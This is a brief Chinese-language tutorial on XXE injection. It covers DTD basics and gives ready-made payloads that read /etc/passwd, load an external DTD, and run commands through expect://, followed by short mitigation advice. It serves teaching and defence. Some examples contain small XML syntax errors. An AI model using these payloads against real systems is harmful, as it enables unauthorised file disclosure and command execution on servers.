XXE

XXE简介

XXE即对于不安全的外部实体进行处理时引发的安全漏洞。

外部引用可以支持http,file，ftp等协议。 如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可 能导致XXE漏洞。

<!--第一部分：XML声明-->
<?xml version="1.0"?>  
<!--第二部分：文档类型定义DTD--> <!DOCTYPE note [ <!--定义此文档是 note 类型的文档-->
<!ENTITY entity-name SYSTEM "URL/URL"> <!--外部实体声明-->
]> 
<!--第三部分：文档元素--> 
<note> 
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>      

DTD介绍

简介:DTD文档类型定义，用来为XML文档定义语义约束。

  * DTD 内部声明: <!DOCTYPE 根元素 [元素声明]>

  * DTD 外部引用: <!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI">

  * 引用公共DTD:<!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI">

XXE利用

通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。

例：
外部实体引用payload:
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>

通过DTD读取文件

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
  <!ENTITY % name SYSTEM "http://127.0.0.1/xxe_file.dtd">
  %name;
]>
<d>&xxe_file;</d>
​
xxe_file.dtd内容：
​
<!ENTITY xxe_file SYSTEM "file:///etc/passwd">

执行系统命令

<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "expect://id" >]>
]>
<x>&xxe;</x>          

读取任意文件

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE aaa [
<!ENTITY name SYSTEM "file:///etc/passwd" >
]>
<name>&name;</name>

防范

禁用XXE，将setExpandEntityReferences设置为false

过滤用户提交的XML数据
